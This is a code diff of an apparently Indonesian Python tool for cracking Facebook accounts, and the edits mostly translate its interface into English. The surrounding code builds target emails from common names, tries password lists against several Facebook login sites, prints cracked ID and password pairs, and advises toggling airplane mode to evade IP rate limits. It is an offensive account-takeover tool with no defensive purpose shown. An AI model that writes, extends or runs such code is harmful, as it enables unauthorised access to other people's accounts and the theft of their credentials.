@@ -524,8 +524,8 @@ def crack_email():
 	xc = ['andi','dwi','muhammad','nur','dewi','tri','dian','sri','putri','eka','sari','aditya','basuki','budi','joni','toni','cahya','riski','farhan','aden','joko']
 	blk = ['99','official','gaming','utama','123','1234','12345','123456','cakep']
 	global ok , cp
-	cetak(nel(f'Masukan Nama Email Yang Ingin Di Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,padding=(0,5),style=f"bold blue"))
-	nama = console.input(f' [+] Masukan Nama Target : ')
+	cetak(nel(f'Enter the Email Name You Want to Crack, Contoh : Andi, Dian, Putri, Aditya',width=90,padding=(0,5),style=f"bold blue"))
+	nama = console.input(f' [+] Enter Target Name : ')
 	if ',' in str(nama):
 		print(f" [+] Masukan Nama, Jangan Kosong Ngab")
 		time.sleep(3);exit()
@@ -534,7 +534,7 @@ def crack_email():
 	if '@' not in str(doma) or '.com' not in str(doma):
 		print(f" [+] Masukan Domain Dengan Benar")
 		time.sleep(3);exit()
-	cetak(nel(f'Max 5000 Idz , Dan Hanya Bisa Menggunakan Metode Reguler Dan Async',width=90,padding=(0,5),style=f"bold blue"))
+	cetak(nel(f'Max 5000 Id , And Can Only Use Regular And Async Methods',width=90,padding=(0,5),style=f"bold blue"))
 	jumlah = console.input(f' [+] Total Dump : ')
 	for xyz in range(int(jumlah)):
 		A = nama
@@ -621,29 +621,29 @@ def result():
 			geeh = input(f'\n{P}{x}{H} [+] {x}{P}{x} {P}Select{x} : ')
 			try:geh = lol[geeh]
 			except KeyError:
-				print(' [+] Pilih Yang Bener Kontol ')
+				print(' [+] Choose the Right One ')
 				exit()
 			try:lin = open('CP/'+geh,'r').read().splitlines()
 			except:
-				print(' [+] File Tidak Di Temukan ')
+				print(' [+] File Not Found ')
 				time.sleep(4)
 				back()
 			nocp=0
 			for cpku in range(len(lin)):
 				cpkuni=lin[nocp].split('|')
 				cpkuh=f'# ID : {cpkuni[0]} PASSWORD : {cpkuni[1]}'
-				sol().print(mark(cpkuh,style="yellow"))
+				sol().print(mark(cpkuh,style="red"))
 				nocp +=1
 			input('[ Klik Enter ]')
 			back()
 	elif kz in ['1','01']:
 		try:vin = os.listdir('OK')
 		except FileNotFoundError:
-			print(' [+] File Tidak Di Temukan ')
+			print(' [+] File Not Found ')
 			time.sleep(4)
 			back()
 		if len(vin)==0:
-			print(' [+] Anda Tidak Mempunyai File OK ')
+			print(' [+] You Do not Have OK File ')
 			time.sleep(4)
 			back()
 		else:
@@ -683,7 +683,7 @@ def result():
 	elif kz in ['3','03']:
 		back()
 	else:
-		print(' [+] Pilih Yang Bener Kontol ')
+		print(' [+] Choose the Right One ')
 		exit()
 #-------------------[ CRACK-PUBLIK-MASSAL]----------------#
 def brayen_dump():
@@ -756,7 +756,7 @@ def dump_massal():
 		back()
 #-------------[ PENGATURAN-IDZ ]---------------#
 def setting():
-	cetak(panel(f'[bold blue][[bold cyan]01[/][bold blue]][/] [bold blue]Crack Idz Old Ke New [[bold red]Not Recommended[bold blue]][/]\n[bold blue][[bold cyan]02[/][bold blue]][/] [bold blue]Crack Idz New Ke Old [[bold green]Very Recommended[bold blue]][/]\n[bold blue][[bold cyan]03[/][bold blue]][/] [bold blue]Crack Idz Random [[bold green]Very Recommended[bold blue]][/]',width=90,padding=(0,8),title=f"[bold green]Setting Urutan Idz",style=f"bold blue"))
+	cetak(panel(f'[bold blue][[bold cyan]01[/][bold blue]][/] [bold blue]Crack Idz Old Ke New [[bold red]Not Recommended[bold blue]][/]\n[bold blue][[bold cyan]02[/][bold blue]][/] [bold blue]Crack Idz New Ke Old [[bold green]Very Recommended[bold blue]][/]\n[bold blue][[bold cyan]03[/][bold blue]][/] [bold blue]Crack Random Id New/Old [[bold green]Very Recommended[bold blue]][/]',width=90,padding=(0,8),title=f"[bold green]Setting Urutan Idz",style=f"bold blue"))
 	hu = input(f' [+] Pilih Urutan Idz : ')
 	if hu in ['1','01']:
 		for tua in sorted(id):
@@ -776,7 +776,7 @@ def setting():
 			xx = random.randint(0,len(id2))
 			id2.insert(xx,bacot)
 	else:
-		print(' [+] Pilih Yang Bener Kontooll ')
+		print(' [+] Choose the Right One ')
 		exit()
 	urut = []
 	urut.append(panel(f'[bold blue][[bold cyan]01[/][bold blue]][/] [bold blue]Login Site [bold green]m.facebook.com[bold blue] [/]\n[bold blue][[bold cyan]02[/][bold blue]][/] [bold blue]Login Site [bold green]mbasic.facebook.com[bold blue] [/]\n[bold blue][[bold cyan]03[/][bold blue]][/] [bold blue]Login Site [bold green]free.facebook.com[bold blue] ',width=42,title=f"[bold green]Validate",style=f"bold blue"))
@@ -807,9 +807,9 @@ def setting():
 	    method.append('colmek2')
 	else:
 		method.append('validate1')
-	cetak(panel('''[bold blue][[bold cyan]01[bold blue]] [bold blue]Menggunakan Password V1 [[bold green]Recommended[bold blue]]
-[bold blue][[bold cyan]02[bold blue]] [bold blue]Menggunakan Password V2 [[bold green]Very Recommended[bold blue]]
-[bold blue][[bold cyan]03[bold blue]] [bold blue]Menggunakan Password Manual [[bold red]Not Recommended[bold blue]]''',style='bold blue',title='[bold green]Setting Password',padding=(0,8),width=90))
+	cetak(panel('''[bold blue][[bold cyan]01[bold blue]] [bold blue]Using Password V1 [[bold green]Recommended[bold blue]]
+[bold blue][[bold cyan]02[bold blue]] [bold blue]Using Password V2 [[bold green]Very Recommended[bold blue]]
+[bold blue][[bold cyan]03[bold blue]] [bold blue]Using Manual Passwords [[bold red]Not Recommended[bold blue]]''',style='bold blue',title='[bold green]Setting Password',padding=(0,8),width=90))
 	pwplus=input(f' [+] {P}Pilih Sandi : ')
 	if pwplus in ['03','3']:
 		pwpluss.append('ya')
@@ -855,7 +855,7 @@ def passwrd():
 	print('')
 	urut = []
 	urut.append(panel(f'        [bold green]%s [bold blue]'%(okc),width=43,title=f"[bold green]OK SAVE IN",style=f"bold blue"))
-	urut.append(panel(f'         [bold yellow]%s [bold blue]'%(cpc),width=44,title=f"[bold yellow]CP SAVE IN",style=f"bold blue"))
+	urut.append(panel(f'         [bold red]%s [bold blue]'%(cpc),width=44,title=f"[bold red]CP SAVE IN",style=f"bold blue"))
 	wa.print(Columns(urut))
 	cetak(panel(f'\t[bold blue]On/Off Mode Pesawat Setiap 300 Idz Agar Terhindar Dari Spam Ip',width=90,title=f"[bold green]Informasi",subtitle=f"[bold green]Proses Crack",style=f"bold blue"))
 	prog = Progress(SpinnerColumn('clock'),TextColumn('{task.description}'),BarColumn(),TextColumn('{task.percentage:.0f}%'))
